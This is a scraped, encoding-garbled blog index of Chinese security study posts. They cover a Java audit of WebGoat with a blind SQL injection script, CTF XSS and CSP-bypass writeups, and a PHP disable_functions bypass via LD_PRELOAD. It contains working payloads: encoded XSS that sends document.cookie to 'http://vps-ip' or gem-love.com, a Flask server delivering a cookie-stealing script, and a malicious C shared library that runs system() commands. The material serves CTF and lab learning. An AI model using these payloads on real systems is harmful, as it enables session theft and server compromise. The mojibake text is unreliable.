å‚è€ƒé“¾æ¥ https://xz.aliyun.com/t/2041 https://www.freebuf.com/vuls/115849.html https://www.iswin.org/2016/01/24/Spring-framework-deserialization-RCE-%E5%88%86%E6%9E%90%E4%BB%A5%E5%8F%8A%E5%88%A9%E7%94%A8/","categories":[],"tags":[{"name":"java","slug":"java","permalink":"https://glotozz.github.io/tags/java/"}]},{"title":"javaå®¡è®¡å…¥é—¨","slug":"javaå®¡è®¡å…¥é—¨","date":"2020-02-28T00:48:22.000Z","updated":"2020-03-25T08:04:35.880Z","comments":true,"path":"2020/02/28/javaå®¡è®¡å…¥é—¨/","link":"","permalink":"https://glotozz.github.io/2020/02/28/java%E5%AE%A1%E8%AE%A1%E5%85%A5%E9%97%A8/","excerpt":"å¼€å§‹å­¦javağŸƒâ€â™€ï¸","text":"å¼€å§‹å­¦javağŸƒâ€â™€ï¸ &nbsp; &nbsp; &nbsp;&nbsp;&nbsp;ç®€é™‹çš„ç›®å½• å‡†å¤‡å·¥ä½œ WebGoat 8 å¼€å§‹å®¡è®¡ SqlInjection å‚è€ƒé“¾æ¥ ä¸€èˆ¬é¢è¯•éƒ½ä¼šé—®åˆ°javaæ¼æ´äº†è§£å˜›ï¼Œä¼šåˆ†æğŸ´ï¼Œä½†æˆ‘ä¸€èˆ¬éƒ½æ˜¯åˆ©ç”¨ç°æˆå·¥å…·æˆ–è€…expã€‚è¶è¿˜æ²¡å¼€å­¦æ—¶é—´æ¯”è¾ƒå¤šï¼Œå­¦ä¹ ä¸€ä¸‹javaä»£ç å®¡è®¡ã€‚ å‡†å¤‡å·¥ä½œå®‰è£… è¿è¡Œjavaç¨‹åºï¼šå…ˆç¼–è¯‘a.java=&gt;a.classï¼Œå› æ­¤.classç»“å°¾çš„å­—èŠ‚ç æ–‡ä»¶éœ€è¦åç¼–è¯‘ï¼Œå·¥å…·æˆ‘ä¸€èˆ¬ç”¨jadx javaå¹³å°ï¼šjava seï¼Œjava eeï¼Œjava meï¼Œä¸»è¦å­¦ä¹ ç¬¬äºŒä¸ªwebæœåŠ¡ å¸¸è§çš„javaæœåŠ¡å™¨ï¼š Tomcatã€Weblogicã€JBossã€GlassFish ï¼Œä¸»è¦å­¦ä¹ Tomcat Tomcatç›®å½•ç»“æ„ Tomcatéƒ¨ç½²æºç  javapmsä¸ºä¾‹ ä»¥SpringMVC+Spring+Hibernate+Freemarker+Html5+jQueryä¸ºæŠ€æœ¯æ ¸å¿ƒæ¶æ„ IDEA å¯¼å…¥é¡¹ç›®å¹¶æ·»åŠ tomcaté…ç½® IDEAè°ƒè¯•åŠŸèƒ½ å½“å‰é¡¹ç›®ç»“æ„ä¸å¤ªæ‡‚ï¼Œä¸çŸ¥é“å¦‚ä½•ä¸‹æ”¾æ–­ç‚¹ï¼Œè·³è¿‡ Maven-é¡¹ç›®ç®¡ç†å’Œæ„å»ºå·¥å…· Mavenæ˜¯ä¸€ç§è‡ªåŠ¨æ„å»ºé¡¹ç›®çš„æ–¹å¼ï¼Œå¯ä»¥å¸®åŠ©æˆ‘ä»¬è‡ªåŠ¨ä»æœ¬åœ°å’Œè¿œç¨‹ä»“åº“æ‹‰å–å…³è”jaråŒ…ã€‚ éƒ¨ç½²WebGoatä¸ºä¾‹ï¼Œå¯¼å…¥é¡¹ç›® å®Œæˆä¹‹åbackgroundå°±å¼€å§‹ä¸‹è½½ï¼Œä½†æ˜¯é€Ÿåº¦ Fortify ä»£ç å®¡è®¡å·¥å…· æš‚æ—¶å…ˆä¹Ÿä¸ç”¨ WebGoat 8 WebGoat8æ˜¯åŸºäºSpring bootæ¡†æ¶å¼€å‘,æ•…æ„ä¸å®‰å…¨çš„Webåº”ç”¨ç¨‹åºï¼Œæ—¨åœ¨æ•™æˆWebåº”ç”¨ç¨‹åºå®‰å…¨æ€§è¯¾ç¨‹ã€‚ éœ€è¦çš„ç¯å¢ƒï¼šjava 11ã€Maven &gt; 3.2.1ã€IDEA å®‰è£… 1234git clone https:&#x2F;&#x2F;github.com&#x2F;WebGoat&#x2F;WebGoat.gitcd WebGoatmvn clean package -Dmaven.test.skip&#x3D;truemvn -pl webgoat-server spring-boot:run -Dmaven.test.skip&#x3D;true å› ä¸ºæˆ‘æœ‰ä¸ªåŒ…ä¸‹è½½å¤±è´¥äº†å°±è·³è¿‡è¿™ä¸ªåŒ… æœ€åæ˜¯å¦‚ä¸‹çš„ç•Œé¢ import WebGoatåˆ°IDEA è¿›è¡Œä»£ç æŸ¥çœ‹åŠè°ƒè¯• å‘ç°å·²ç»é…ç½®å¥½äº† ç»„ä»¶å®‰å…¨ ä¹Ÿæš‚æ—¶è·³è¿‡ Dependency-Checkæ˜¯OWASPï¼ˆOpen Web Application Security Projectï¼‰çš„ä¸€ä¸ªå®ç”¨å¼€æºç¨‹åº ã€‚ é¡¹ç›®åœ°å€ä»¥åŠå‚è€ƒæ•™ç¨‹ å¼€å§‹å®¡è®¡ç¬¬ä¸€ä¸ªé¡µé¢æ˜¯ç™»å½•ï¼Œç™»å½•æ˜¯å¾ˆå®¹æ˜“å­˜åœ¨æ¼æ´çš„åŠŸèƒ½ç‚¹ä¹‹ä¸€ã€‚ æ²¡å­¦è¿‡Spring bootæ¡†æ¶ï¼Œæ—¢ç„¶è·¯ç”±æ˜¯/loginï¼Œå…¨å±€æœç´¢login æ‰¾åˆ°org/owasp/webgoat/WebSecurityConfig.java å¤§è‡´èƒ½çœ‹æ‡‚ï¼Œä½†æ˜¯æ¼æ´çœ‹ä¸å‡ºæ¥==ï¼Œå…ˆçœ‹ä¸‹é¢è¿™ä¸ªç±»ä¼¼è®¤è¯çš„æ–¹æ³• æŸ¥é˜…AuthenticationManagerBuilder auth ï¼Œå…è®¸è½»æ¾æ„å»ºå†…å­˜èº«ä»½éªŒè¯ï¼ŒLDAPèº«ä»½éªŒè¯ï¼ŒåŸºäºJDBCçš„èº«ä»½éªŒè¯ï¼Œæ·»åŠ UserDetailsServiceä»¥åŠæ·»åŠ AuthenticationProviderã€‚ é‚£ä¹ˆè¿½è¸ªuserDetailsService 1private final UserService userDetailsService; è¿½è¸ªUserService å’Œæ–‡ç« ä¸€æ ·ï¼ŒuserRepository.findByUsername(username)çŒœæµ‹æ˜¯æ•°æ®åº“æŸ¥è¯¢ï¼Œ è¿½è¸ª æ˜¯ä¸ªæ¥å£ï¼Œè¿½è¸ª è¿˜æ˜¯ä¸ªæ¥å£ï¼Œå®ç°äº†æ›´å¤šæ–¹æ³•ï¼Œç»§ç»­è¿½è¸ªï¼Œæœ€ååˆ°Repositoryæ¥å£æˆ‘ä¹Ÿæ²¡æ‰¾åˆ°å®ç°è¿™ä¸ªæ¥å£çš„ä»£ç  è¿™æ˜¯ä¸ªå¯¼å…¥çš„åŒ…ï¼Œçœ‹æ¥å·²ç»é«˜åº¦é›†æˆï¼Œé‚£ä¹ˆåªéœ€è¦çŸ¥é“å…¶ç”¨æ³•å³å¯ [Spring Boot æ­ç§˜ä¸å®æˆ˜ï¼ˆäºŒï¼‰] å®ä½“å¯¹è±¡ åˆ›å»ºä¸€ä¸ª Author å®ä½“ï¼ŒçœŸå®çš„è¡¨åæ˜¯ t_authorï¼ŒåŒ…å« idï¼ˆè‡ªå¢ä¸»é”®ï¼‰ã€ realNameã€ nickname å­—æ®µã€‚ 123456789101112131415@Entity@Table(name &#x3D; &quot;t_author&quot;)public class Author&#123; @Id @GeneratedValue(strategy &#x3D; GenerationType.AUTO) private Long id; @Column(name&#x3D;&quot;real_name&quot;) private String realName; @Column(name&#x3D;&quot;nick_name&quot;) private String nickName; &#x2F;&#x2F; SETå’ŒGETæ–¹æ³•&#125; DAOç›¸å…³ 1234567public interface AuthorRepository extends JpaRepository&lt;Author, Long&gt; &#123; List&lt;Author&gt; findAll(); @Query(&quot;from Author where id &#x3D; :id&quot;) Author findAuthor(@Param(&quot;id&quot;) Long id);&#125; è¿™ä¸ªfromçš„æ˜¯å¯¹è±¡åï¼Œæ„Ÿè§‰ç±»ä¼¼äºé¢„ç¼–è¯‘ï¼Œèƒ½é˜²æ­¢sqlæ³¨å…¥ SpringBootæŸ¥è¯¢findByè§„åˆ™ æ‰€ä»¥ä¸Šé¢çš„ç±»ä¼¼äºfileByUsername()ç±»ä¼¼äº 1... where username&#x3D;?1 æ—¢ç„¶ä¸å­˜åœ¨sqlæ³¨å…¥ï¼Œç»§ç»­å›å»çœ‹ createUser()åï¼Œåœ¨ä¹‹å‰public WebGoatUser loadUserByUsername(String username)çš„return webGoatUseråæ‰“ä¸Šæ–­ç‚¹ï¼Œå¹¶æ‰§è¡Œä¸‹ä¸€æ­¥ï¼Œè·³è½¬å¦‚ä¸‹ åœ¨è¿›è¡Œæ¯”è¾ƒã€‚ æ³¨å†ŒåŠŸèƒ½ å…¨å±€æœç´¢è·¯ç”±/registration è¿½è¸ªvalidate() ä¹‹åå°±æ˜¯addUser()ï¼Œè·Ÿè¸ªä¸‹å‘ç°ä¹Ÿæ˜¯åˆ©ç”¨å°è£…å¥½çš„save()æ’å…¥æ•°æ®åº“ è¯´å¥½çš„ä¸å®‰å…¨å‘¢ï¼Ÿï¼ŸåŸæ¥æ˜¯è¦ç™»å½•è¿›å»æ‰å¼€å§‹å®éªŒ SqlInjectionå…¨å±€æœç´¢sqlinjectionå°±èƒ½æ‰¾åˆ°æºç  æŸ¥è¯¢çš„æ•°æ®ä¸­department=Marketingæ‰æœ‰å›æ˜¾ å°è¯•è”åˆæ³¨å…¥ 1select * from employees where department&#x3D;&#39;Marketing&#39; union select 1,2,3,&#39;Marketing&#39;,5,database() Something went wrongï¼Œåº”è¯¥æ˜¯ä¸æ”¯æŒè¿™ç§è¯­æ³•ï¼Œè¿½è¸ªä¸‹æ•°æ®åº“ ä¸çŸ¥é“æ˜¯å•¥ç±»å‹ï¼Œæµ‹è¯•å‘ç°ç›²æ³¨ä¹Ÿä¸è¡Œï¼Œå’Œmysqlä¸æ˜¯ä¸€ä¸ªè¯­æ³•çš„ã€‚ã€‚è¿™å…³ä¼¼ä¹åªæ˜¯ç†Ÿæ‚‰sqlè¯­æ³• challenge-9 sqlè¯­å¥å·²ç»ç»™äº†ï¼Œç®€å•çš„æ‹¼æ¥ã€‚ã€‚ æŸ¥çœ‹æŒ‘æˆ˜org/owasp/webgoat/sql_injection/advanced/SqlInjectionChallenge.java æ˜æ˜¾é—®é¢˜å‡ºåœ¨checkUserQueryï¼Œæ˜¯ä¸ªå¸ƒå°”ç›²æ³¨ï¼Œå¦‚æœæ˜¯mysqlå°±ä¸å†™äº†ï¼Œè¿™é‡Œå†™ä¸ªè„šæœ¬è¯•è¯• è¿™é‡Œç”¨--å¯ä»¥æ³¨é‡Š substr()å¯ä»¥æˆªå–å­—ç¬¦ä¸² æ„é€ ä¸‹é¢çš„å‘ç°å›æ˜¾ä¸åŒ 12tom&#39;and &#39;1&#39;&#x3D;&#39;0&#39; -- tom&#39;and &#39;1&#39;&#x3D;&#39;1&#39; -- æ˜¯putè¯·æ±‚ï¼Œjsonæ ¼å¼è¿”å› HTTPåè®®ä¸­PUTå’ŒPOSTä½¿ç”¨åŒºåˆ« å†™ä¸ªè„šæœ¬ 12345678910111213141516171819202122232425262728293031323334353637383940#!/usr/bin/env python2# coding=utf-8import requestsimport jsons = requests.session()cookies = &#123; 'JSESSIONID' :'XQ9kMiDyU_tr5apUdGewRRG4qIq7-5uQtiOObyRw'&#125;url = \"http://localhost:8080/WebGoat/SqlInjectionAdvanced/challenge\"headers = &#123; 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0'&#125;flag = \"\"tmp = 0for i in range(1, 100): if tmp == 1: break tmp = 1 for j in range(97, 127): payload = \"password\" param = \"tom' and ascii(substr((&#123;&#125;),&#123;&#125;,1))=&#123;&#125; and '1'='1\".format(payload, str(i), str(j)) print(param) data = &#123; 'username_reg':param, 'email_reg':'bb%40qq.com', 'password_reg':'cc', 'confirm_password_reg':'cc' &#125; r = requests.put(url=url, headers=headers, data=data, cookies=cookies) # r = requests.post(url=url, headers=headers, cookies=cookies, data=data) c = json.dumps(r.json()) # print(c) if \"already\" in c: tmp = 0 flag = flag + chr(j) print(flag) breakprint(flag) æœ€åï¼Œæœ‰ç©ºåˆ†æä¸€ä¸‹springä¸­çš„ååºåˆ—åŒ–æ¼æ´å’ŒFastJsonååºåˆ—åŒ–æ¼æ´ï¼Œçœ‹äº†åŸç†è¿˜æ˜¯æ¯”è¾ƒå®¹æ˜“ç†è§£çš„ã€‚ å‚è€ƒé“¾æ¥ https://bbs.ichunqiu.com/forum.php?mod=viewthread&amp;tid=42149&amp;fromuid=365932 https://www.freebuf.com/vuls/214039.html","categories":[],"tags":[{"name":"java","slug":"java","permalink":"https://glotozz.github.io/tags/java/"}]},{"title":"XSS&bypass CSP","slug":"XSS-bypass-CSP","date":"2020-02-27T02:01:25.000Z","updated":"2020-03-25T08:07:25.724Z","comments":true,"path":"2020/02/27/XSS-bypass-CSP/","link":"","permalink":"https://glotozz.github.io/2020/02/27/XSS-bypass-CSP/","excerpt":"ä»å‡ é“é¢˜å­¦ä¹ XSSä»¥åŠä¸€äº›ç›¸å…³ç»•è¿‡å§¿åŠ¿","text":"ä»å‡ é“é¢˜å­¦ä¹ XSSä»¥åŠä¸€äº›ç›¸å…³ç»•è¿‡å§¿åŠ¿ &nbsp; &nbsp; &nbsp;&nbsp;&nbsp;ç®€é™‹çš„ç›®å½• hgame-Cosmosçš„èŠå¤©å®¤1 hgame-ComcosèŠå¤©å®¤2 RealWorld CTF2019-Mission Invisible RealWorld CTF2019-Hcorme CODEGATE 2020 CSPç»•è¿‡ 0ctf2018-h4xors.club2 å‚è€ƒé“¾æ¥ hgame-Cosmosçš„èŠå¤©å®¤1ç¯å¢ƒå…³äº†ï¼Œåªèƒ½yyä¸€ä¸‹äº†==ï¼ è¿‡æ»¤äº†æ‰€æœ‰é—­åˆæ ‡ç­¾scriptã€iframeç­‰ï¼šre.sub(&quot;&lt;\\/?[^&gt;]+&gt;&quot;, &quot;&quot;, message),å¹¶è½¬åŒ–ä¸ºå¤§å†™ ç”¨æµè§ˆå™¨äº‹ä»¶æ‰§è¡Œjsï¼Œä¸é—­åˆå³æ ‡ç­¾æ—¶ä¼šè‡ªåŠ¨è¡¥å…¨ payload1 123&lt;svg&#x2F;onload&#x3D;&amp;#119&amp;#105&amp;#110&amp;#100&amp;#111&amp;#119&amp;#46&amp;#111&amp;#112&amp;#101&amp;#110&amp;#40&amp;#39&amp;#104&amp;#116&amp;#116&amp;#112&amp;#58&amp;#47&amp;#47&amp;#118&amp;#112&amp;#115&amp;#45&amp;#105&amp;#112&amp;#39&amp;#43&amp;#100&amp;#111&amp;#99&amp;#117&amp;#109&amp;#101&amp;#110&amp;#116&amp;#46&amp;#99&amp;#111&amp;#111&amp;#107&amp;#105&amp;#101&amp;#41&amp;#59&amp;#47&amp;#47 ç¼–ç å†…å®¹window.open(&#39;http://vps-ip&#39;+document.cookie);// payload2 å¼•å…¥å¤–éƒ¨é¡µé¢ è¿™ä¸ªåšæ³•ä»…é™chrome 1&lt;link rel=\"import\"href=\"http://vps-ip/\" ä½†æ˜¯éœ€è¦è§£å†³è·¨åŸŸé—®é¢˜ï¼Œä½¿ç”¨flaskæˆ–è€…SimpleHTTPServerå¼€ä¸ªæœåŠ¡å³å¯ 1234567891011from flask import *app = Flask(__name__)@app.route('/')def hello_world(): response = make_response(\"&lt;script&gt;window.open('http://vps-ip/'+document.cookie)&lt;/script&gt;\") response.headers['Access-Control-Allow-Origin'] = '*' return responseif __name__ == '__main__': app.run(host=\"0.0.0.0\",port=80) æœ¬åœ°æµ‹è¯• hgame-ComcosèŠå¤©å®¤2å°†scriptæ›¿æ¢ä¸ºç©ºï¼ŒåŒå†™ç»•è¿‡ï¼Œä½†æ˜¯å‡ºç°æŠ¥é”™ Refused to execute inline script because it violates the following ContentSecurity Policy directive: â€œscript-src â€˜selfâ€™â€. Either the â€˜unsafe-inlineâ€™keyword, a hash (â€˜sha256-bhHHL3z2vDgxUt0W3dWQOrprscmda2Y5pLsLg4GF+pI=â€™), or anonce (â€˜nonce-â€¦â€™) is required to enable inline execution. æŸ¥çœ‹CSPç­–ç•¥ 1Content-Security-Policy: default-src &#39;self&#39;; script-src &#39;self&#39; å®ƒé™åˆ¶äº†å†…è” JS è„šæœ¬ï¼Œå¹¶ä¸”é™åˆ¶äº†å¼•å…¥çš„é™æ€èµ„æºæ–‡ä»¶åªèƒ½ä»åŒåŸŸä¸‹åŠ è½½ã€‚åœ¨å®é™…åº”ç”¨ä¸­ï¼Œé‡åˆ°è¿™ç§CSP â¼€èˆ¬æ˜¯æ‰¾è¯¥ç«™æ˜¯å¦æœ‰æ–‡ä»¶ä¸Šä¼ ç‚¹ï¼Œä¸Šä¼ â¼€ä¸ªå†…å®¹ä¸º alert(/xss/) çš„å›¾â½šå†å¼•ç”¨ï¼Œä¹Ÿå¯ä»¥åŒæºä¸‹æœ‰æ²¡æœ‰å¯ä»¥æ‰§è¡Œä»»æ„ JS ä»£ç çš„ evil.js æ–‡ä»¶ã€‚ æœ¬é¢˜ä¸­æœ‰â¼€ä¸ªæ¥å£ /sendï¼Œå®ƒä¼šè¿”å›è¿‡æ»¤åçš„æ¶ˆæ¯å†…å®¹ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨ 1&lt;scriscriptpt src&#x3D;&quot;&#x2F;send?message&#x3D;alert(1)&quot;&gt;&lt;&#x2F;scscriptript&gt; RealWorld CTF2019-Mission Invisibleç»™äº†æºç ï¼Œæ ¸å¿ƒæ˜¯ 123456789101112131415161718&lt;script&gt; function setElement(tag) &#123; tag = tag.substring(0, 1); var ele = document.createElement(tag) var attrs = getCookie(\"attrs\").split(\"&amp;\"); for (var i = 0; i &lt; attrs.length; i++) &#123; var key = attrs[i].split(\"=\")[0]; var value = attrs[i].split(\"=\")[1]; ele.setAttribute(key, value); &#125; document.body.appendChild(ele); &#125; var tag = getUrlParam(\"tag\"); setCookie(\"tag\", tag); setElement(tag);&lt;/script&gt; å¯ä»¥æ„é€ ä¸€ä¸ªæ ‡ç­¾å¹¶ä¸ºå…¶è®¾ç½®å±æ€§ åªèƒ½ä½¿ç”¨aã€pï¼Œä½†æ˜¯éœ€è¦ä½¿å…¶è‡ªåŠ¨è§¦å‘ï¼Œè§£å†³åŠæ³•å¦‚ä¸‹ 1&lt;p onfocus&#x3D;&quot;alert(document.cookie)&quot; id&#x3D;&quot;1&quot; tabindex&#x3D;&quot;0&quot;&gt;&lt;&#x2F;p&gt; chromeæµ‹è¯•æˆåŠŸ ä¹‹åå¸¸è§„æ‰“cookieå³å¯ RealWorld CTF2019-Hcorme é¢˜ç›®æœ‰ä¸€ä¸ªcallbackçš„æ¥å£ï¼Œèƒ½å¤ŸæŠŠè¯·æ±‚å‚æ•°è¾“å‡ºï¼Œå¹¶ä¸”æ˜¯text/htmlå½¢å¼ã€‚ ä¸¤ä¸ªé™åˆ¶ï¼šXSS Auditorã€Content-Security-Policy: default-src &#39;self&#39;; object-src &#39;none&#39;; base-uri &#39;none&#39;; Hardoldå¸ˆå‚…çš„æ€è·¯â€”&gt;utf-16ç¼–ç ç»•è¿‡ å› ä¸ºåœ¨UTF-16æ–‡ä»¶çš„å¼€é¦–ï¼Œéƒ½ä¼šæ”¾ç½®ä¸€ä¸ªU+FEFFå­—ç¬¦ä½œä¸ºByte Order Markï¼ˆUTF-16LEä»¥FF FEä»£è¡¨ï¼ŒUTF-16BEä»¥FE FFä»£è¡¨ï¼‰ï¼Œä»¥æ˜¾ç¤ºè¿™ä¸ªæ–‡æœ¬æ–‡ä»¶æ˜¯ä»¥UTF-16ç¼–ç ï¼Œå®ƒæ˜¯ä¸ªæ²¡æœ‰å®½åº¦ä¹Ÿæ²¡æœ‰æ–­å­—çš„ç©ºç™½ã€‚ çŒœæµ‹æ˜¯ç±»ä¼¼æˆªæ–­çš„åŸç†ï¼Œä»è€Œbypass XSS Auditor ç»•è¿‡CSPï¼Œæ˜¯åˆ©ç”¨JSONPç›´æ¥æŠŠjsä»£ç æŒ‚è½½åˆ°æœ¬åœ°çš„script ä¼šè¿›è¡Œä¸¤æ¬¡èµ„æºè¯·æ±‚ï¼Œç¬¬äºŒæ¬¡çš„èµ„æºç±»å‹æ˜¯script 1print(quote((&#39;&lt;script&#x2F;src&#x3D;?callback&#x3D;alert(1)&gt;&lt;&#x2F;script&gt;&#39;).encode(&#39;utf-16&#39;))) CODEGATE 2020 CSPç»•è¿‡å‰é¢æ˜¯ä¸€ä¸ªç®€å•çš„æ­£åˆ™ç»•è¿‡ï¼Œå‘ç°å­˜åœ¨CSP script-src &#39;none&#39; view.phpæäº¤åˆ°api.phpï¼Œæ ¼å¼ä¸ºname/p1/p2ï¼Œå¯ä»¥è®¾ç½®header è§£å†³åŠæ³•ï¼šhttpçŠ¶æ€ç ç½®ä¸º102æ—¶ï¼ŒCSPä¸ä¼šæ‰§è¡Œ é¢–å¥‡å¸ˆå‚…çš„payload 12345678910#author: é¢–å¥‡L'Amore#www.gem-love.comimport base64csp1 = str(base64.b64encode(b'header') ,encoding = \"utf8\")csp2 = str(base64.b64encode(b'HTTP/1.1'),encoding = \"utf8\")csp3 = str(base64.b64encode(b'102'),encoding = \"utf8\")name = str(base64.b64encode(b'body'),encoding = \"utf8\")xss = str(base64.b64encode(b'&lt;script\\n&gt;window.open(\"http://gem-love.com:12345/?\"+document.cookie);&lt;/script\\n&gt;'),encoding = \"utf8\")p3 = \"MQ==\" #p3 is uselessprint('|&#123;&#125;,&#123;&#125;,&#123;&#125;|&#123;&#125;,&#123;&#125;,&#123;&#125;'.format(csp1,csp2,csp3,name,xss,p3)) 0ctf2018-h4xors.club2å‘ç°çœ‹ä¸æ‡‚==ï¼ä»¥åå†æ¥è¡¥ æœ€åç»™ä¸ªåˆ†äº«ä¸ªé“¾æ¥ï¼Œé‡åˆ°é—®é¢˜å¯ä»¥æŸ¥ä¸€æŸ¥ï¼šCSPç­–ç•¥åŠç»•è¿‡æ–¹æ³• å‚è€ƒé“¾æ¥ https://www.anquanke.com/post/id/186707 https://github.com/vidar-team/Hgame2020_writeup/ https://www.gem-love.com/ctf/1329.html#CSP http://www.wupco.cn/?p=4408","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://glotozz.github.io/tags/ctf/"}]},{"title":"ä»ä¸€é“é¢˜å­¦ä¹ bypass disable_func","slug":"ä»ä¸€é“é¢˜å­¦ä¹ bypass-disable-func","date":"2020-02-26T00:07:29.000Z","updated":"2020-03-25T08:07:03.573Z","comments":true,"path":"2020/02/26/ä»ä¸€é“é¢˜å­¦ä¹ bypass-disable-func/","link":"","permalink":"https://glotozz.github.io/2020/02/26/%E4%BB%8E%E4%B8%80%E9%81%93%E9%A2%98%E5%AD%A6%E4%B9%A0bypass-disable-func/","excerpt":"ctfå’Œæ¸—é€ç»å¸¸ä¼šé‡åˆ°éœ€è¦bypass disable_funcï¼Œå€Ÿä¸‹é¢è¿™é“é¢˜å­¦ä¹ ä¸‹åŸç†","text":"ctfå’Œæ¸—é€ç»å¸¸ä¼šé‡åˆ°éœ€è¦bypass disable_funcï¼Œå€Ÿä¸‹é¢è¿™é“é¢˜å­¦ä¹ ä¸‹åŸç† &nbsp; &nbsp; &nbsp;&nbsp;&nbsp;ç®€é™‹çš„ç›®å½• TCTF wallbreaker easy ä¸€ã€dl()-æ‹“å±•åº“ç»•è¿‡ äºŒã€imap_mail() ä¸‰ã€putenv() å››ã€ini_set äº”ã€apache_setenv å‚è€ƒé“¾æ¥ TCTF wallbreaker easy å¾ˆæ˜æ˜¾ï¼Œç»™äº†æˆ‘ä»¬ä¸€ä¸ªåé—¨ï¼Œæç¤ºéœ€è¦ç”¨Imagickæ¥ç»•è¿‡disable_functionï¼Œè®¾ç½®äº†open_basedirï¼Œå…ˆçœ‹çœ‹phpinfo() å¯¹æ¯”ç¦ç”¨åˆ—è¡¨ 1dl,exec,system,passthru,popen,proc_open,pcntl_exec,shell_exec,mail,imap_open,imap_mail,putenv,ini_set,apache_setenv,symlink,link =================åˆ†å‰²çº¿ åŠ ä¸ªerror_log 1dl,exec,system,passthru,popen,proc_open,pcntl_exec,shell_exec,mail,imap_open,imap_mail,putenv,ini_set,apache_setenv,symlink,link,error_log =================åˆ†å‰²çº¿ å‡½æ•°å¯¹åº”çš„åˆ©ç”¨ç‚¹ 1234567å¸¸è§„ç»•è¿‡: execã€shell_execã€systemã€passthruã€popenã€proc_openld_preloadç»•è¿‡: mailã€imap_mailã€error_logã€mb_send_mailpcntl_execimap_openfastcgicomapache mod-cgi è¿˜å­˜åœ¨ä¸‹é¢5ä¸ª 12345dlimap_mailputenvini_setapache_setenv é‚£ä¹ˆå°±å¯¹è¿™ä¸ª5ä¸ªä¸€ä¸€åˆ†æ ä¸€ã€dl()-æ‹“å±•åº“ç»•è¿‡ å®ç°æ–¹æ³•å‚è€ƒï¼šhttps://cloud.tencent.com/developer/article/1141142 ç‰ˆæœ¬ è¯´æ˜ 7.0.0 PHP-FPM æ¨¡å¼ä¸‹å·²ç¦ç”¨ dl()ã€‚ 5.3.9 å°½ç®¡ä¸æ¨èï¼Œä½† PHP-FPM æ¨¡å¼ä¸‹å¯ç”¨äº† dl()ã€‚ 5.3.0 ç”±äºç¨³å®šæ€§ï¼Œdl() åœ¨æŸäº› SAPI ä¸­è¢«ç¦ç”¨ã€‚ä»…ä»…å…è®¸ dl() çš„ SAPI ä¸º CLI å’Œ Embedã€‚ ä½¿ç”¨ æ‰©å±•åŠ è½½æŒ‡ä»¤ ä½œä¸ºæ›¿ä»£ã€‚ SAPIï¼ˆServer Application Programming Interfaceï¼‰æœåŠ¡å™¨åº”ç”¨ç¨‹åºç¼–ç¨‹æ¥å£ï¼Œå³PHPä¸å…¶ä»–åº”ç”¨äº¤äº’çš„æ¥å£ï¼ŒPHPè„šæœ¬è¦æ‰§è¡Œæœ‰å¾ˆå¤šæ–¹å¼ï¼Œé€šè¿‡WebæœåŠ¡å™¨ï¼Œæˆ–è€…ç›´æ¥åœ¨å‘½ä»¤è¡Œä¸‹ï¼Œä¹Ÿå¯ä»¥åµŒå…¥åœ¨å…¶ä»–ç¨‹åºä¸­ã€‚ SAPIæä¾›äº†ä¸€ä¸ªå’Œå¤–éƒ¨é€šä¿¡çš„æ¥å£ï¼Œå¸¸è§çš„SAPIæœ‰ï¼šcgiã€fast-cgiã€cliã€apacheæ¨¡å—çš„DLLã€isapi 1Server API FPM&#x2F;FastCGI è¿™é‡Œæœªå¼€å¯dlï¼Œé‚ä½œç½¢ äºŒã€imap_mail() https://www.exploit-db.com/exploits/35146 é€‚ç”¨äºPHP &lt; 5.6.2çš„ï¼Œé‚ä½œç½¢ ä¸‰ã€putenv()putenv()å¯ä»¥è®¾ç½®ç¯å¢ƒå˜é‡ 1putenv ( string $setting ) : bool æ·»åŠ  setting åˆ°æœåŠ¡å™¨ç¯å¢ƒå˜é‡ã€‚ ç¯å¢ƒå˜é‡ä»…å­˜æ´»äºå½“å‰è¯·æ±‚æœŸé—´ã€‚ åœ¨è¯·æ±‚ç»“æŸæ—¶ç¯å¢ƒä¼šæ¢å¤åˆ°åˆå§‹çŠ¶æ€ã€‚ ä¸»è¦æ˜¯å’ŒLD_PRELOADæ‰“ä¸€å¥—ç»„åˆæ‹³ LD_PRELOADè¿™ä¸ªç¯å¢ƒå˜é‡æŒ‡å®šè·¯å¾„çš„æ–‡ä»¶ï¼Œä¼šåœ¨å…¶ä»–æ–‡ä»¶è¢«è°ƒç”¨å‰ï¼Œæœ€å…ˆè¢«è°ƒç”¨ 1.åˆ¶ä½œä¸€ä¸ªæ¶æ„shared libraries2.ä½¿ç”¨putenvè®¾ç½®LD_PRELOADä¸ºæ¶æ„æ–‡ä»¶è·¯å¾„3.ä½¿ç”¨æŸä¸ªphpå‡½æ•°ï¼Œè§¦å‘specific shared library4.æˆåŠŸè¿›è¡ŒRCE å¯»æ‰¾ä¸€ä¸ªèƒ½è§¦å‘è¿™ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶çš„phpå‡½æ•° æœ€å¸¸è§çš„æ˜¯mail() 123&lt;?php mail(&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;);?&gt; straceä¸€ä¸‹ 1strace -f -e execve php a.php å¾—åˆ° æŸ¥çœ‹ç¨‹åºå¯èƒ½è°ƒç”¨çš„ç³»ç»ŸAPI 1readelf -Ws &#x2F;usr&#x2F;sbin&#x2F;sendmail æœ‰å¾ˆå¤šå‡½æ•°å¯ä»¥ä½¿ç”¨ï¼Œè¿™é‡Œå¯ä»¥é€‰æ‹©geteuid() hack.c 123456789101112#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;void payload() &#123; system(&quot;ls &#x2F; &gt; &#x2F;tmp&#x2F;sky&quot;);&#125;int geteuid() &#123; if (getenv(&quot;LD_PRELOAD&quot;) &#x3D;&#x3D; NULL) &#123; return 0; &#125; unsetenv(&quot;LD_PRELOAD&quot;); payload();&#125; è¿™é‡Œè¦ç”Ÿæˆ shared libraries 12gcc -c -fPIC hack.c -o hackgcc --share hack -o hack.so ä¿®æ”¹a.php 1234&lt;?php putenv(&quot;LD_PRELOAD&#x3D;.&#x2F;hack.so&quot;); mail(&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;);?&gt; è¿è¡Œä¸‹ï¼Œå‘ç°/tmpä¸‹ç”Ÿæˆäº†æ¶æ„æ–‡ä»¶ï¼ŒæŸ¥çœ‹ è¿›é˜¶ 